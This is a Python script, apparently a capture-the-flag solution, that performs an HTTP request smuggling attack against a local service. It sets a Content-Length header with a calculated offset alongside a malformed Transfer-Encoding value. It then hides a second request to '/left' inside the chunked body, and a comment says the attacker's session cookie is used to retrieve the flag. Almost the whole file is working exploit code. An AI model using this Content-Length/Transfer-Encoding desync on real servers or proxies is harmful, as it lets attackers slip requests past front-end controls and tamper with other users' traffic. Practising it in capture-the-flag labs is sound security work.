#!/usr/bin/env python3
import socket
from request_builder import Request_Builder
import time

def single(direction='down'):
    HOST = '0.0.0.0'
    PORT = 8002

    flag_request_builder = Request_Builder()
    flag_request_builder.url = "/left"
    flag_request_builder.host = "{}:{}".format(HOST, PORT)
    flag_request = flag_request_builder.build()

    hello_request_builder = Request_Builder()
    hello_request_builder.url = "/{}".format(direction)
    hello_request_builder.host = "{}:{}".format(HOST, PORT)
    hello_request_builder.add_content_length_header = True
    hello_request_builder.content_length_offset = - len(flag_request) + len(hex(len(flag_request)).replace("0x", "") + "\r\n")
    hello_request_builder.add_chunked_encoding_header = True
    hello_request_builder.add_chunked_encoding_header_value = "asd"
    hello_request_builder.add_chunked_encoding_body = True
    hello_request_builder.body = flag_request
    hello_request = hello_request_builder.build()

    extra_request_builder = Request_Builder()
    extra_request_builder.url = "/{}".format(direction)
    extra_request_builder.host = "{}:{}".format(HOST, PORT)
    extra_request = extra_request_builder.build()

    msg = hello_request + extra_request
    # print("SEND:")
    # print(msg)
    # print("RAW:")
    # print(msg.encode("ascii"))

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((HOST, PORT))
        s.sendall(msg.encode("ascii"))
        # response = s.recv(1024).decode("ascii")
        # print("RECEIVED:")
        # print(response)
        # time.sleep(1)
        # response = s.recv(1024).decode("ascii")
        # print("RECEIVED:")
        # print(response)

if __name__ == '__main__':
    #Before running change in the request_builder file the session cookie that your browser received. This will allow you to see the flag

    #This has to be run multiple times depending on the picture
    single()
    single(direction='up')
